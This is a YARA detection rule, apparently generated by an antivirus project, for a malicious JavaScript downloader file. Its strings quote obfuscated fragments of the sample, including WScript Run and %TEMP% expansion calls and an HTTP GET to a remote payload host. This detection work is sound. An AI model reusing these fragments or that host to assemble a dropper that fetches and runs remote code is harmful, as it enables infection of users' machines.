rule sig_20160428_55da3ba948b748dc3b3d64238da14a6b {
  meta:
    description = "datamaliciousorder - file 20160428_55da3ba948b748dc3b3d64238da14a6b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "0faed4f3edf69f2565a6a159381c0402983a9c8b05d76580245136c65f53dc2e"

  strings:
    $s1  = "function QtaKqzJjyRqmJadYbkIft(GufCecEumHseArdXlmSly){AsmRzqTklNgqDbnKexAxa[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function EncSqvAcpEbaSuzQchVdq() {return AsmRzqTklNgqDbnKexAxa[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function QtaKqzJjyRqmJadYbkIft(GufCecEumHseArdXlmSly){AsmRzqTklNgqDbnKexAxa[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return QytNokZdcQmwKaqHpyYht - RltAukJaeFgyAjwFaaApu;};" fullword ascii
    $s5  = "function UwlLucTotNnbJdpPifYys(QytNokZdcQmwKaqHpyYht, RltAukJaeFgyAjwFaaApu){BocHauJzpRmbEfsNmhZmd = BocHauJzpRmbEfsNmhZmd * 1; " ascii
    $s6  = "XkqCksSmnZzfOodRmeYvx[GjaSwfQzdJusKnoNcvAne](\"G\" + \"ET\", \"http://zahariev.myjino.ru/n8sja\", false);" fullword ascii
    $s7  = "function EncSqvAcpEbaSuzQchVdq() {return AsmRzqTklNgqDbnKexAxa[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s8  = "var AsmRzqTklNgqDbnKexAxa = function IqbPkhLmfWrzAojFvaOgk() {return JndKcaLgnChiHvvCeaUch[SvrHkoSyeOmiVrfGixNjv](\"WScript\"+\"" ascii
    $s9  = "if (XkqCksSmnZzfOodRmeYvx[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s10 = "function MnxWexGjjDsrKjjNlmAsl(){return GjjVkoByeKymPrjEygXds + \"\";};" fullword ascii
    $s11 = "function UwlLucTotNnbJdpPifYys(QytNokZdcQmwKaqHpyYht, RltAukJaeFgyAjwFaaApu){BocHauJzpRmbEfsNmhZmd = BocHauJzpRmbEfsNmhZmd * 1; " ascii
    $s12 = "function IwkPkhOsyCiqJqhDgdYsl() {return ((HtnQdjPeyDzfSwkKvoWjv == true) && (HtnQdjPeyDzfSwkKvoWjv == UwwZtoZavYcoBoeJwnYwj)) ?" ascii
    $s13 = "function IwkPkhOsyCiqJqhDgdYsl() {return ((HtnQdjPeyDzfSwkKvoWjv == true) && (HtnQdjPeyDzfSwkKvoWjv == UwwZtoZavYcoBoeJwnYwj)) ?" ascii
    $s14 = "var AsmRzqTklNgqDbnKexAxa = function IqbPkhLmfWrzAojFvaOgk() {return JndKcaLgnChiHvvCeaUch[SvrHkoSyeOmiVrfGixNjv](\"WScript\"+\"" ascii
    $s15 = "var JndKcaLgnChiHvvCeaUch = this[\"WScript\"];" fullword ascii
    $s16 = "}while (FqoCkeHvlPyuZlnZviIpw);" fullword ascii
    $s17 = "var BvrZolLjqIkbFutNkyZiz = new this[\"D\"+\"ate\"]();" fullword ascii
    $s18 = "var HtnQdjPeyDzfSwkKvoWjv = false;" fullword ascii
    $s19 = "function EzrMsrFmlXnkZvkMldHse(){return SvrHkoSyeOmiVrfGixNjv;};" fullword ascii
    $s20 = "HtnQdjPeyDzfSwkKvoWjv = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}